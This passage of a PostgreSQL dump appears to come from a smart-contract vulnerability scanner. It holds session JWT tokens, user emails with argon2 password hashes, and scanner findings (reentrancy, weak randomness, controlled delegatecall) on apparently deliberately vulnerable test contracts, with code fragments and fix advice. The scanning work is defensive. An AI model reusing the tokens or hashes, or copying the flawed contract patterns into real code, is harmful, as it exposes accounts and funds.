1b487bc2-f035-4de8-9663-f7f306d17af9	56bc0604-49bc-4a73-8b4f-69fc3386a0f8	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjA3NzEyMjAsInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJhY2Nlc3MifQ.Fmai1G7Wk0pGRq0lukGR0ivN-kK_SAVQ7LLPtmC0U48	eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjEzNjUyMjAsInN1YiI6IjU2YmMwNjA0LTQ5YmMtNGE3My04YjRmLTY5ZmMzMzg2YTBmOCIsInR5cGUiOiJyZWZyZXNoIn0.vJHi3uT3WE81zx6oFh7wdm6M5G0x6IX37XQiRPEthxs	2025-10-25 04:07:00.778626+00	2025-10-17 21:13:28.215771+00	f
\.


--
-- Data for Name: user_preferences; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.user_preferences (user_id, email_notifications, scan_completion_notifications, critical_vulnerability_alerts, weekly_digest, theme, timezone, language, preferences, created_at, updated_at) FROM stdin;
\.


--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.users (id, email, hashed_password, is_active, is_superuser, created_at, updated_at) FROM stdin;
ab45210a-44a1-490e-bd5f-18135cdc3c91	test-rebrand@blocksecops.com	$argon2id$v=19$m=19456,t=2,p=1$sm+y1rLBeZNoPxD8Uhcu4g$BKR67ES9839NooP974YTcsS+SO8W9AmdlPQhflt0ZbM	t	f	2025-10-16 21:48:57.229258+00	2025-10-16 21:48:57.229258+00
27850871-1cd4-4804-9c1d-6cf8fb90fbd2	pdf-test@example.com	$argon2id$v=19$m=19456,t=2,p=1$tQ31cEsbrSUr+sakt3sVcw$BfM5icymMA1TCsPXDj9YA1pUrAKHcEm3rEtZdLE1BgE	t	f	2025-10-17 14:50:03.722194+00	2025-10-17 14:50:03.722194+00
56bc0604-49bc-4a73-8b4f-69fc3386a0f8	admin@blocksecops.com	$argon2id$v=19$m=19456,t=2,p=1$D/LW7GwVqYPpkAgmeA8Rug$cEyqRknTwLa1FsX2A0DDLFnnpU4pJIqkLIbrY6YRQPU	t	f	2025-10-17 20:44:19.232032+00	2025-10-17 20:44:19.232032+00
\.


--
-- Data for Name: vulnerabilities; Type: TABLE DATA; Schema: public; Owner: postgres
--

COPY public.vulnerabilities (id, scan_id, contract_id, title, description, severity, status, swc_id, line_number, code_snippet, recommendation, detected_at, updated_at, scanner_id, category, confidence) FROM stdin;
b06ae689-bbe6-4609-a28d-8de5fcc4e7b5	5461ec78-43f7-4a30-86cf-f120b6473196	86f9a16f-7896-4115-b321-adf9db382682	Reentrancy Eth	Reentrancy in VulnerableBank.withdraw() (ReEntrancy Contract.sol#19-29):\n\tExternal calls:\n\t- (success,None) = msg.sender.call{value: amount}() (ReEntrancy Contract.sol#24)\n\tState variables written after the call(s):\n\t- balances[msg.sender] = 0 (ReEntrancy Contract.sol#28)\n\tVulnerableBank.balances (ReEntrancy Contract.sol#12) can be used in cross function reentrancies:\n\t- VulnerableBank.balances (ReEntrancy Contract.sol#12)\n\t- VulnerableBank.deposit() (ReEntrancy Contract.sol#14-16)\n\t- VulnerableBank.withdraw() (ReEntrancy Contract.sol#19-29)\n	high	open	reentrancy-eth	19	    // VULNERABLE: State update happens after external call\n    function withdraw() public {\n        uint256 amount = balances[msg.sender];\n        require(amount > 0, "Insufficient balance");	Use the Checks-Effects-Interactions pattern. Move external calls to the end of the function after all state changes.	2025-10-16 22:16:09.78698+00	2025-10-16 22:15:59.040916+00	\N	\N	\N
4378478f-64c6-4c37-ab40-614ed24c5dba	5461ec78-43f7-4a30-86cf-f120b6473196	86f9a16f-7896-4115-b321-adf9db382682	Immutable States	ReentrancyAttacker.vulnerableBank (ReEntrancy Contract.sol#41) should be immutable \n	low	open	immutable-states	41	contract ReentrancyAttacker {\n    VulnerableBank public vulnerableBank;\n    uint256 public attackCount;\n	Review the code and consult Slither documentation for specific recommendations.	2025-10-16 22:16:09.787161+00	2025-10-16 22:15:59.040916+00	\N	\N	\N
bd32bea5-6939-4bc8-85aa-1a1065db3761	9d566dd4-a057-43b4-adc4-ed7051a4900b	86f9a16f-7896-4115-b321-adf9db382682	Reentrancy Eth	Reentrancy in VulnerableBank.withdraw() (ReEntrancy Contract.sol#19-29):\n\tExternal calls:\n\t- (success,None) = msg.sender.call{value: amount}() (ReEntrancy Contract.sol#24)\n\tState variables written after the call(s):\n\t- balances[msg.sender] = 0 (ReEntrancy Contract.sol#28)\n\tVulnerableBank.balances (ReEntrancy Contract.sol#12) can be used in cross function reentrancies:\n\t- VulnerableBank.balances (ReEntrancy Contract.sol#12)\n\t- VulnerableBank.deposit() (ReEntrancy Contract.sol#14-16)\n\t- VulnerableBank.withdraw() (ReEntrancy Contract.sol#19-29)\n	high	open	reentrancy-eth	19	    // VULNERABLE: State update happens after external call\n    function withdraw() public {\n        uint256 amount = balances[msg.sender];\n        require(amount > 0, "Insufficient balance");	Use the Checks-Effects-Interactions pattern. Move external calls to the end of the function after all state changes.	2025-10-16 22:16:33.343259+00	2025-10-16 22:16:27.023053+00	\N	\N	\N
509b9c82-08c1-493f-beff-96eeb9a237a2	9d566dd4-a057-43b4-adc4-ed7051a4900b	86f9a16f-7896-4115-b321-adf9db382682	Immutable States	ReentrancyAttacker.vulnerableBank (ReEntrancy Contract.sol#41) should be immutable \n	low	open	immutable-states	41	contract ReentrancyAttacker {\n    VulnerableBank public vulnerableBank;\n    uint256 public attackCount;\n	Review the code and consult Slither documentation for specific recommendations.	2025-10-16 22:16:33.343661+00	2025-10-16 22:16:27.023053+00	\N	\N	\N
354d21a6-a700-45c7-850e-1f07a9f7c5c7	31742a9d-5f1d-42a7-819a-c873870d252d	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 01:05:29.925867+00	2025-10-17 01:05:29.925867+00	\N	\N	\N
1bcd8121-6b29-47ae-a011-e13ae15262ba	ad9f0969-beda-485f-bbaa-6d854cbb86da	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:17:23.865724+00	2025-10-17 17:17:23.865724+00	\N	\N	\N
c9f3f064-504f-40ac-a81f-dbbf94d24537	ab38ce7e-f785-4195-9cbc-f5005a03a531	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:25:03.770008+00	2025-10-17 17:25:03.770008+00	\N	\N	\N
66c5120b-0295-472a-9247-714a849169aa	f259704f-3393-4ef6-88c7-f59a4f41c586	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:27:08.823072+00	2025-10-17 17:27:08.823072+00	\N	\N	\N
5a443e08-263a-49c6-a97e-1914f56c9cb3	1546015b-d5f5-4e9e-9d76-ecc8d082d88e	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:30:38.370197+00	2025-10-17 17:30:38.370197+00	\N	\N	\N
f9548d68-fcb4-47d7-b722-a4127f2ab3f2	0ffcad6c-ac72-4278-9ae3-e846d397530a	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:34:55.189274+00	2025-10-17 17:34:55.189274+00	\N	\N	\N
05661a38-9ba5-411a-8edf-6ba4be296c12	8c5f9f99-0634-4833-890e-3f3aae0ef221	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:48:20.311103+00	2025-10-17 17:48:20.311103+00	\N	\N	\N
805e36d3-3923-45bd-a234-89501d953d86	5d741b89-e602-4862-9bda-4eea5acf333f	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:52:35.868994+00	2025-10-17 17:52:35.868994+00	\N	\N	\N
625971b4-da2f-4d9b-8376-9e9bf6ea2bfb	9e06c8f8-30e1-4b62-8332-3bb8da5068a4	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:55:28.153663+00	2025-10-17 17:55:28.153663+00	\N	\N	\N
542b3c9f-3e87-435f-b207-cafc668e7e09	e6d541e1-65d3-4072-9263-7b3714135fe0	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 17:58:24.084041+00	2025-10-17 17:58:24.084041+00	\N	\N	\N
b70f037c-0ae7-4a4f-a121-f1767df2def1	0300d842-455a-4102-9fa0-684e5e5d53fa	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 18:03:18.311543+00	2025-10-17 18:03:18.311543+00	\N	\N	\N
bb469d80-50ac-48a3-9939-64fc0e51d3c7	77b7e537-a626-4e5a-9697-9bfdd8b64551	fc783138-6c5a-4dce-b469-9fdf46020f14	Msg Value Loop	VulnerableDistributor.distributeRewards() (contract.sol#42-54) use msg.value in a loop: reward = (msg.value * shares[shareholders[i_scope_0]]) / totalShares (contract.sol#51)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** msg-value-loop	critical	open	\N	42		\N	2025-10-17 18:21:41.482781+00	2025-10-17 18:21:41.482781+00	\N	\N	\N
8002b0bc-048a-4ada-abe6-e097717db9d4	50226168-4bd5-460e-8976-0dd50d6e7016	98593981-74f4-43f4-b7f6-3d795f4a488c	Arbitrary Ether Send	VulnerableRandomness.playGame() (contract.sol#98-109) sends eth to arbitrary user\n\tDangerous calls:\n\t- address(msg.sender).transfer(20000000000000000) (contract.sol#105)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** arbitrary-send-eth	critical	open	\N	98		Implement access control to restrict who can trigger Ether transfers. Consider using withdrawal pattern instead of send pattern.	2025-10-17 19:10:39.241762+00	2025-10-17 19:10:39.241762+00	\N	\N	\N
01904add-4d39-4e70-abf9-237ffa83229d	50226168-4bd5-460e-8976-0dd50d6e7016	98593981-74f4-43f4-b7f6-3d795f4a488c	Weak Pseudo-Random Number Generator	VulnerableRandomness.generateRandomNumber() (contract.sol#85-96) uses a weak PRNG: "random = uint256(keccak256(bytes)(abi.encodePacked(block.timestamp,block.difficulty,block.number,msg.sender))) % 100 (contract.sol#87-92)"\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** weak-prng	critical	open	\N	85		Do not use block properties (timestamp, blockhash) for randomness. Use Chainlink VRF or similar oracle-based randomness solution.	2025-10-17 19:10:39.241762+00	2025-10-17 19:10:39.241762+00	\N	\N	\N
77c88644-a381-47c6-ae1d-5a736cd15250	50226168-4bd5-460e-8976-0dd50d6e7016	98593981-74f4-43f4-b7f6-3d795f4a488c	Weak Pseudo-Random Number Generator	VulnerableTimelock.emergencyWithdraw() (contract.sol#69-74) uses a weak PRNG: "require(bool,string)(block.timestamp % 2 == 0,Can only withdraw on even seconds) (contract.sol#71)"\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** weak-prng	critical	open	\N	69		Do not use block properties (timestamp, blockhash) for randomness. Use Chainlink VRF or similar oracle-based randomness solution.	2025-10-17 19:10:39.241762+00	2025-10-17 19:10:39.241762+00	\N	\N	\N
ca76ae11-453c-4b67-ba2e-ab364e6629a1	50226168-4bd5-460e-8976-0dd50d6e7016	98593981-74f4-43f4-b7f6-3d795f4a488c	Weak Pseudo-Random Number Generator	VulnerableLottery.drawWinner() (contract.sol#29-40) uses a weak PRNG: "randomIndex = uint256(keccak256(bytes)(abi.encodePacked(block.timestamp,block.difficulty))) % players.length (contract.sol#34)"\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** weak-prng	critical	open	\N	29		Do not use block properties (timestamp, blockhash) for randomness. Use Chainlink VRF or similar oracle-based randomness solution.	2025-10-17 19:10:39.241762+00	2025-10-17 19:10:39.241762+00	\N	\N	\N
7e1039f6-0f2e-462a-ab91-e8de02e364bc	50226168-4bd5-460e-8976-0dd50d6e7016	98593981-74f4-43f4-b7f6-3d795f4a488c	Incorrect Equality	VulnerableTimelock.emergencyWithdraw() (contract.sol#69-74) uses a dangerous strict equality:\n\t- require(bool,string)(block.timestamp % 2 == 0,Can only withdraw on even seconds) (contract.sol#71)\n\n**Impact:** Medium\n**Confidence:** High\n\n**Detector:** incorrect-equality	high	open	\N	69		\N	2025-10-17 19:10:39.241762+00	2025-10-17 19:10:39.241762+00	\N	\N	\N
2ed6f199-91d1-4535-bf49-73242bdc8186	67b31138-1bd4-4422-bfdb-564f441ce01d	43195d13-0923-4e91-9008-cb6ccd854b66	Reentrancy Attack (Ether)	Reentrancy in VulnerableBank.withdraw() (contract.sol#19-29):\n\tExternal calls:\n\t- (success) = msg.sender.call{value: amount}() (contract.sol#24)\n\tState variables written after the call(s):\n\t- balances[msg.sender] = 0 (contract.sol#28)\n\tVulnerableBank.balances (contract.sol#12) can be used in cross function reentrancies:\n\t- VulnerableBank.balances (contract.sol#12)\n\t- VulnerableBank.deposit() (contract.sol#14-16)\n\t- VulnerableBank.withdraw() (contract.sol#19-29)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** reentrancy-eth	critical	open	\N	19		Apply the checks-effects-interactions pattern: 1) Check conditions, 2) Update state, 3) Make external calls. Consider using OpenZeppelin's ReentrancyGuard modifier.	2025-10-17 21:15:16.150978+00	2025-10-17 21:15:16.150978+00	\N	\N	\N
8c326bb5-9880-42e4-a2fc-5398c808f419	b0e9ac5e-bc8a-441f-933c-4e8782683e66	4557d54f-bc37-4e82-819f-32a9a5137315	Arbitrary Ether Send	VulnerablePuzzle.submitSolution(string) (contract.sol#23-31) sends eth to arbitrary user\n\tDangerous calls:\n\t- address(msg.sender).transfer(reward) (contract.sol#30)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** arbitrary-send-eth	critical	open	\N	23		Implement access control to restrict who can trigger Ether transfers. Consider using withdrawal pattern instead of send pattern.	2025-10-17 21:31:34.262851+00	2025-10-17 21:31:34.262851+00	\N	\N	\N
dd8610cf-3366-4659-90b5-e709d3545668	b0e9ac5e-bc8a-441f-933c-4e8782683e66	4557d54f-bc37-4e82-819f-32a9a5137315	Locked Ether	Contract locking ether found:\n\tContract VulnerableICO (contract.sol#81-107) has payable functions:\n\t - VulnerableICO.buyTokens(uint256) (contract.sol#98-106)\n\tBut does not have a function to withdraw the ether\n\n**Impact:** Medium\n**Confidence:** High\n\n**Detector:** locked-ether	high	open	\N	81		\N	2025-10-17 21:31:34.262851+00	2025-10-17 21:31:34.262851+00	\N	\N	\N
046bbdd4-d980-4d3c-8659-49ba4e64bab8	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Controlled Delegatecall	VulnerableRegistry.executeLogic(bytes) (contract.sol#124-127) uses delegatecall to a input-controlled function id\n\t- (success) = logicContract.delegatecall(_data) (contract.sol#125)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** controlled-delegatecall	critical	open	\N	124		Avoid using delegatecall with user-controlled targets. If necessary, use a whitelist of approved contracts.	2025-10-17 21:35:51.463832+00	2025-10-17 21:35:51.463832+00	\N	\N	\N
fc97bb5a-a729-4b33-b862-181eb39319b0	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Controlled Delegatecall	VulnerableWallet.fallback() (contract.sol#82-86) uses delegatecall to a input-controlled function id\n\t- (success) = libAddress.delegatecall(msg.data) (contract.sol#84)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** controlled-delegatecall	critical	open	\N	82		Avoid using delegatecall with user-controlled targets. If necessary, use a whitelist of approved contracts.	2025-10-17 21:35:51.463832+00	2025-10-17 21:35:51.463832+00	\N	\N	\N
cbc00f9f-ac59-4481-b41f-21194eb2aa2f	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Controlled Delegatecall	VulnerableProxy.execute(address,bytes) (contract.sol#29-33) uses delegatecall to a input-controlled function id\n\t- (success) = _target.delegatecall(_data) (contract.sol#31)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** controlled-delegatecall	critical	open	\N	29		Avoid using delegatecall with user-controlled targets. If necessary, use a whitelist of approved contracts.	2025-10-17 21:35:51.463832+00	2025-10-17 21:35:51.463832+00	\N	\N	\N
80221585-654a-469f-a39e-2aa657ab6782	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Controlled Delegatecall	UninitializedProxy.fallback() (contract.sol#163-166) uses delegatecall to a input-controlled function id\n\t- (success) = implementation.delegatecall(msg.data) (contract.sol#164)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** controlled-delegatecall	critical	open	\N	163		Avoid using delegatecall with user-controlled targets. If necessary, use a whitelist of approved contracts.	2025-10-17 21:35:51.463832+00	2025-10-17 21:35:51.463832+00	\N	\N	\N
2bfe3b83-f5e0-4bd2-a9c7-dd1022f8ef72	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Controlled Delegatecall	VulnerableWallet.withdraw(uint256) (contract.sol#73-80) uses delegatecall to a input-controlled function id\n\t- (success) = libAddress.delegatecall(abi.encodeWithSignature(withdraw(uint256),_amount)) (contract.sol#76-78)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** controlled-delegatecall	critical	open	\N	73		Avoid using delegatecall with user-controlled targets. If necessary, use a whitelist of approved contracts.	2025-10-17 21:35:51.463832+00	2025-10-17 21:35:51.463832+00	\N	\N	\N
d5df1ff4-92ac-4017-8705-70262aeec586	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Suicidal	MaliciousLogic.destroy(address) (contract.sol#135-138) allows anyone to destruct the contract\n\n**Impact:** High\n**Confidence:** High\n\n**Detector:** suicidal	critical	open	\N	135		\N	2025-10-17 21:35:51.463832+00	2025-10-17 21:35:51.463832+00	\N	\N	\N
0c67d090-a132-4797-b9d3-49c78fb7de4e	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Suicidal	MaliciousImplementation.destroy() (contract.sol#49-51) allows anyone to destruct the contract\n\n**Impact:** High\n**Confidence:** High\n\n**Detector:** suicidal	critical	open	\N	49		\N	2025-10-17 21:35:51.463832+00	2025-10-17 21:35:51.463832+00	\N	\N	\N
da79350e-26a3-4647-af64-9e17a3862a7c	0540d982-7d72-45a0-a8ca-a30a24a9f710	526f3007-70d4-4bf2-a53e-2d99ead52669	Controlled Delegatecall	VulnerableProxy.forward(bytes) (contract.sol#21-26) uses delegatecall to a input-controlled function id\n\t- (success) = implementation.delegatecall(_data) (contract.sol#24)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** controlled-delegatecall	critical	fixed	\N	21		Avoid using delegatecall with user-controlled targets. If necessary, use a whitelist of approved contracts.	2025-10-17 21:35:51.463832+00	2025-10-17 21:49:41.554976+00	\N	\N	\N
fae61385-c9e7-483f-afc8-1882853c784d	d27fe555-06b6-47b1-bf8f-d7b28b9a1779	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	Erc20 Interface	VulnerableMapping (contract.sol#149-175) has incorrect ERC20 function interface:VulnerableMapping.approve(address,uint256) (contract.sol#161-163)\n\n**Impact:** Medium\n**Confidence:** High\n\n**Detector:** erc20-interface	high	open	\N	149		\N	2025-10-17 22:27:30.237187+00	2025-10-17 22:27:30.237187+00	\N	\N	\N
9400d793-ee35-4744-9a19-185feaa96c2f	d27fe555-06b6-47b1-bf8f-d7b28b9a1779	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	Mapping Deletion	VulnerableMapping.deleteUser() (contract.sol#166-170) deletes VulnerableMapping.User (contract.sol#150-153) which contains a mapping:\n\t-delete users[msg.sender] (contract.sol#169)\n\n**Impact:** Medium\n**Confidence:** High\n\n**Detector:** mapping-deletion	high	open	\N	166		\N	2025-10-17 22:27:30.237187+00	2025-10-17 22:27:30.237187+00	\N	\N	\N
05a47790-8b91-4b49-8371-8d1db044e39b	d27fe555-06b6-47b1-bf8f-d7b28b9a1779	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	Uninitialized Local	VulnerableStorage.addUser(address,uint256).newUser (contract.sol#35) is a local variable never initialized\n\n**Impact:** Medium\n**Confidence:** Medium\n\n**Detector:** uninitialized-local	high	open	\N	35		\N	2025-10-17 22:27:30.237187+00	2025-10-17 22:27:30.237187+00	\N	\N	\N
919c2362-2369-4db4-beea-af4c9fdcc987	d27fe555-06b6-47b1-bf8f-d7b28b9a1779	0e2ea42e-a14d-446a-a193-04a3fbefbd6c	Uninitialized Local	StorageCollision.createTransaction(address,uint256).txn (contract.sol#138) is a local variable never initialized\n\n**Impact:** Medium\n**Confidence:** Medium\n\n**Detector:** uninitialized-local	high	open	\N	138		\N	2025-10-17 22:27:30.237187+00	2025-10-17 22:27:30.237187+00	\N	\N	\N
039cb732-10b4-4b5c-8f8f-1ebe7c51a22c	92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	Arbitrary Ether Send	MaliciousReceiver.attack(address,uint256) (contract.sol#94-103) sends eth to arbitrary user\n\tDangerous calls:\n\t- vulnerable.deposit{value: _amount}() (contract.sol#98)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** arbitrary-send-eth	critical	open	\N	94		Implement access control to restrict who can trigger Ether transfers. Consider using withdrawal pattern instead of send pattern.	2025-10-17 22:29:56.089651+00	2025-10-17 22:29:56.089651+00	\N	\N	\N
688ea2cd-d78d-4438-b822-2c29a118c23a	92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	Reentrancy Attack (State Changes)	Reentrancy in VulnerableIntegration.claimReward() (contract.sol#64-74):\n\tExternal calls:\n\t- externalContract.executeAction(msg.sender) (contract.sol#69)\n\tState variables written after the call(s):\n\t- rewards[msg.sender] = 0 (contract.sol#72)\n\tVulnerableIntegration.rewards (contract.sol#57) can be used in cross function reentrancies:\n\t- VulnerableIntegration.claimReward() (contract.sol#64-74)\n\t- VulnerableIntegration.rewards (contract.sol#57)\n\t- VulnerableIntegration.setReward(address,uint256) (contract.sol#76-78)\n\n**Impact:** Medium\n**Confidence:** Medium\n\n**Detector:** reentrancy-no-eth	high	open	\N	64		Ensure state changes occur before external calls. Follow the checks-effects-interactions pattern.	2025-10-17 22:29:56.089651+00	2025-10-17 22:29:56.089651+00	\N	\N	\N
ef1d7945-1504-4d65-b871-7c94c9863c2b	92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	Unchecked Low-Level Call	VulnerablePayment.batchPayout(address[],uint256[]) (contract.sol#37-44) ignores return value by _recipients[i].call{value: _amounts[i]}() (contract.sol#42)\n\n**Impact:** Medium\n**Confidence:** Medium\n\n**Detector:** unchecked-lowlevel	high	open	\N	37		Always check the return value of low-level calls (call, delegatecall, staticcall). Use require() to validate the success boolean.	2025-10-17 22:29:56.089651+00	2025-10-17 22:29:56.089651+00	\N	\N	\N
6ec90ecd-cd96-415f-b306-aaf23f11a642	92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	Unchecked Send Return Value	VulnerablePayment.withdrawWithSend(address,uint256) (contract.sol#28-34) ignores return value by _recipient.send(_amount) (contract.sol#33)\n\n**Impact:** Medium\n**Confidence:** Medium\n\n**Detector:** unchecked-send	high	open	\N	28		Check the return value of send() and transfer() calls. Consider using call{value: amount}() with proper checks instead.	2025-10-17 22:29:56.089651+00	2025-10-17 22:29:56.089651+00	\N	\N	\N
a3149731-5c4e-4aec-a301-43d3c2dc9eb3	92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	Unused Return	VulnerableIntegration.claimReward() (contract.sol#64-74) ignores return value by externalContract.executeAction(msg.sender) (contract.sol#69)\n\n**Impact:** Medium\n**Confidence:** Medium\n\n**Detector:** unused-return	high	open	\N	64		\N	2025-10-17 22:29:56.089651+00	2025-10-17 22:29:56.089651+00	\N	\N	\N
fc2d3c48-282d-49dc-b68c-57f6a8ad2225	92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	Unchecked Low-Level Call	VulnerablePayment.withdrawUnchecked(address,uint256) (contract.sol#18-25) ignores return value by _recipient.call{value: _amount}() (contract.sol#23)\n\n**Impact:** Medium\n**Confidence:** Medium\n\n**Detector:** unchecked-lowlevel	high	fixed	\N	18		Always check the return value of low-level calls (call, delegatecall, staticcall). Use require() to validate the success boolean.	2025-10-17 22:29:56.089651+00	2025-10-17 22:33:34.333496+00	\N	\N	\N
3b451a39-2753-4208-8546-0fc69b6583e9	92197c37-a3e0-4d4f-ad78-1f262a27703b	97970ea9-196b-4643-95e6-f1aa019bcf6f	Arbitrary Ether Send	VulnerablePayment.batchPayout(address[],uint256[]) (contract.sol#37-44) sends eth to arbitrary user\n\tDangerous calls:\n\t- _recipients[i].call{value: _amounts[i]}() (contract.sol#42)\n\n**Impact:** High\n**Confidence:** Medium\n\n**Detector:** arbitrary-send-eth	critical	false_positive	\N	37		Implement access control to restrict who can trigger Ether transfers. Consider using withdrawal pattern instead of send pattern.	2025-10-17 22:29:56.089651+00	2025-10-17 22:33:36.92334+00	\N	\N	\N
\.


--
-- Name: alembic_version alembic_version_pkc; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.alembic_version
    ADD CONSTRAINT alembic_version_pkc PRIMARY KEY (version_num);


--
-- Name: contract_files contract_files_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.contract_files
    ADD CONSTRAINT contract_files_pkey PRIMARY KEY (id);


--
-- Name: contracts contracts_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.contracts
    ADD CONSTRAINT contracts_pkey PRIMARY KEY (id);


--
-- Name: project_contracts project_contracts_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.project_contracts
    ADD CONSTRAINT project_contracts_pkey PRIMARY KEY (project_id, contract_id);


--
-- Name: projects projects_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.projects
    ADD CONSTRAINT projects_pkey PRIMARY KEY (id);


--
-- Name: saved_searches saved_searches_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.saved_searches
    ADD CONSTRAINT saved_searches_pkey PRIMARY KEY (id);


--
-- Name: scans scans_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
--

ALTER TABLE ONLY public.scans
    ADD CONSTRAINT scans_pkey PRIMARY KEY (id);


--
